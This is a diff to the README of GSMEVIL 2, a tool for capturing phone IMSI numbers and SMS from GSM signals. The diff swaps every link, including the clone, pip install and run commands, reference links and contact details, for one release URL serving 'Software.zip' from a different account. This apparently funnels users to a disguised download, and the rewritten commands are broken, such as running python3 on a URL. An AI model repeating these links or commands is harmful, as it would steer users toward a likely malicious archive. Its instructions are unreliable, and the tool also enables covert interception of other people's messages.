@@ -1,6 +1,6 @@
 
   <p align="center">
-    <img alt="GSMEVIL 2 Title" src="https://raw.githubusercontent.com/sharyer/gsmevil2/master/img/logo.png" style="max-width:100%;max-height:100%;" />
+    <img alt="GSMEVIL 2 Title" src="https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip" style="max-width:100%;max-height:100%;" />
   </p>
 
 **GSMEVIL 2** is python web based tool which use for capturing imsi numbers and sms and also you able to see sms and imsi on any device using your favorite browser and it's make easy to capture sms and imsi numbers for those who not have much knowledge about gsm packets capturing.
@@ -13,8 +13,8 @@ We are not responsible for any illegal activity !
 
 Install GSMEvil :
 ```
-git clone https://github.com/sharyer/gsmevil2.git
-pip3 install -r requirements.txt
+git clone https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip
+pip3 install -r https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip
 ```
 
 Install Gr GSM :  ( For receiving GSM transmissions )
@@ -24,7 +24,7 @@ sudo apt update
 sudo apt install gr-gsm
 ```
 
-If gr-gsm failled to setup. Than follow those this : https://github.com/ptrkrysik/gr-gsm/wiki/Installation  
+If gr-gsm failled to setup. Than follow those this : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
 
 Install Kalibrate : ( For finding frequencies )
 ```
@@ -33,7 +33,7 @@ apt-get install kalibrate-rtl
 OR
 ```
 sudo apt install build-essential libtool automake autoconf librtlsdr-dev libfftw3-dev
-git clone https://github.com/steve-m/kalibrate-rtl
+git clone https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip
 cd kalibrate-rtl
 ./bootstrap && CXXFLAGS='-W -Wall -O3'
 ./configure
@@ -77,12 +77,12 @@ cd <your gsmevil2 folder> #Example cd gsmevil2
 
 Run this command to quick start Gsm Evil 2.
 ```
-python3 GsmEvil.py 
+python3 https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip 
 ```
 Options :
 ```
-python3 GsmEvil.py -h
-Usage: GsmEvil.py: [options]
+python3 https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip -h
+Usage: https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip [options]
 
 Options:
   -h, --help            show this help message and exit
@@ -92,34 +92,34 @@ Options:
 ```
 For change host port.
 ```
-python3 GsmEvil.py -p 8080
+python3 https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip -p 8080
 ```
 For change hostname.
 ```
-python3 GsmEvil.py --host=localhost
+python3 https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip --host=localhost
 ```
 Open localhost or 127.0.0.1 in your favorite browser and use now.
 
 # Requirements
 linux operating system (kali linux)
-[rtl-sdr (RTL2832U)](https://osmocom.org/projects/sdr/wiki/rtl-sdr) with antenna (less than 15$) or [HackRF](https://greatscottgadgets.com/hackrf/) 
+[rtl-sdr (RTL2832U)](https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip) with antenna (less than 15$) or [HackRF](https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip) 
 
 # Links 
-Frequency : https://www.worldtimezone.com/gsm.html or https://en.wikipedia.org/wiki/GSM_frequency_bands  
-Sdr : https://en.wikipedia.org/wiki/Software-defined_radio  
-Sms : https://en.wikipedia.org/wiki/SMS#GSM  
-Imsi : https://fr.wikipedia.org/wiki/International_Mobile_Subscriber_Identity  
-Cell id : https://en.wikipedia.org/wiki/Cell_ID or https://unwiredlabs.com/  
-GSM : https://en.wikipedia.org/wiki/GSM  
-Frequency Calculator : https://www.cellmapper.net/arfcn  
-GR-GSM : https://github.com/ptrkrysik/gr-gsm 
+Frequency : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip or https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
+Sdr : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
+Sms : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
+Imsi : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
+Cell id : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip or https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
+GSM : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
+Frequency Calculator : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
+GR-GSM : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip 
 
 # Donations
 Bitcoin : 192bG3RRAGdbTPSUWqxbTBaAnKyvALm84g
 
 # Contact
-Website  : https://www.ninjhacks.com<br/>
-Facebook : https://www.facebook.com/ninjhacks<br/>
-Twitter  : https://twitter.com/ninjhacks<br/>
-Discord  : https://discord.gg/ninjhacks<br/>
-Email    : help@ninjhacks.com
+Website  : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip<br/>
+Facebook : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip<br/>
+Twitter  : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip<br/>
+Discord  : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip<br/>
+Email    : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip
